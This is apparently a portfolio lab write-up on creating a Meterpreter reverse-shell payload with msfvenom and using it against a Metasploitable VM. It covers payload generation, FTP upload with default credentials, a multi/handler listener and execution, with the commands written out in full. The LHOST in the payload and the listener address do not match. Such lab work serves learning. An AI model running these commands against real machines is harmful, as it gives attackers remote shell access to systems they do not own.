## Scenario
In this Lab, I’ll be using Msfvenom and Metasploit to establish a reverse shell on a target machine. Msfvenom is a command line instance of Metasploit that is used to generate payloads, which is a piece of software that is designed to perform malicious actions on a target system. This payload must be delivered to and executed from the target machine. To do this, an attacker will use social engineering techniques or exploit a known vulnerability on the target machine. 

In this case, I’ll be creating a payload designed to establish a reverse shell. A reverse shell differs from a normal shell in that the target system initiates the connection back to the attacker’s machine. This connection is established when the payload is executed by the user of the target machine. From the attacker’s perspective, a benefit of establishing a reverse shell is that it may help bypass firewalls that block incoming traffic since the connection is coming from the target machine rather than the attacker’s machine. 

## Goals & Objectives
1. Create a reverse shell payload using Metasploit and Msfvenom
3. Transfer the payload to the target machine.
4. Create a listener to "listen" for an incoming connection from the target machine.
6. Execute the payload on the target machine.

## Results
### 📄 Task 1: Run Metasploit and Msfvenom

### 📄 Task 2: Create the reverse shell payload

In Metasploit, I use the following command to create the reverse shell payload:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=5555 -f elf -o reverse-sh.elf
```

![](/assets/images/101_77_metasploit2/step1.png)

```-p linux/x86/meterpreter/reverse_tcp``` specifies the reverse shell payload  
```LHOST``` specifies the IP address of the machine I want the target machine to establish a connection with, which is the attacker’s machine  
```LPORT``` specifies the port the target machine will connect through  
```-f``` specifies the file type. ELF, or Executable and Linkable Format, is a common file format for executable files  
```-o``` saves the payload with the chosen file name: reverse-sh.

### 📄 Task 3: Transfer the payload to the target machine

There are many ways an attacker can transfer a payload to a target machine, such as using social engineering techniques like phishing, USB baiting, or watering hole attacks. For the sake of simplicity, I am provided with the username and password of the target machine.

With those credentials, I can use FTP (file transfer protocol), which is a standard network protocol used to transfer files between devices on a network. I use the following commands:

```bash
ftp 192.168.28.128 
put reverse-sh.elf
by
```

```ftp 192.168.28.128``` establishes the FTP session. 192.168.28.128 is the IP address of the target machine.
```put reverse-sh.elf``` sends the file to the target machine  
```by``` ends the session

### 📄 Task 4: Gain access to the target machine and make the payload executable

I access the target machine by establishing an SSH connection. The Metasploitable VM target machine has a default username and password of "msfadmin" which I use to log in to the machine.

Now that I have access to the target machine, I will give all users on the machine permissions to execute the payload. I use the following command: ```chmod +x reverse-sh.elf```

```chmod``` is the change mode command, which allows me to change the permissions of a file. ```+x``` adds executable permissions to all users. 

To see how changing file permissions works in Linux, see my [Managing File Permissions in Linux](/permissions) project.

### 📄 Task 5: Create a listener on the attacker’s machine

In a reverse shell, the target machine is initiating the connection to the attacker’s machine. In order for the attacker’s machine to acknowledge the connection request from the target machine, a listener must be created on the attacker’s machine. 

The listener essentially acts as a receiver, ready to accept the connection initiated by the reverse shell payload.

In a new terminal on Kali Linux, I initiate Metasploit once more by typing ```msfconsole```. Next, to specify that I want to use a listener, I type ```use exploit/multi/handler```. This tells Metasploit that I want to use the multi/handler module. With this module, I must specify three parameters: the local host (the attacker’s machine), the local port (through which the connection will be established), and the payload type. The following commands establish these parameters:

```bash
set lhost 192.168.28.129  
set lport 5555  
set payload linux/x86/meterpreter/reverse_tcp  
run
```

The attacking machine is now listening for an incoming connection from the target machine.

<br>
<br>
### 📄 Task 6: Execute the payload on the target machine

Finally, with the reverse shell payload in position and the listener active on the attacking machine, I switch back to the first terminal where a connection to the target machine was established using SSH and I type the following:

```./reverse-sh.elf```

Once I hit enter, the reverse shell payload executes. The Metasploit terminal outputs that “Meterpreter session 1 opened.” This indicates that the target machine initated the connection request and the attacking machine accepted the connection.

To find out how a Meterpreter shell works, please refer to my [Upgrading to Meterpreter Shell Using Metasploit](/metasploit1) project. 

Next, I type shell to access the shell.
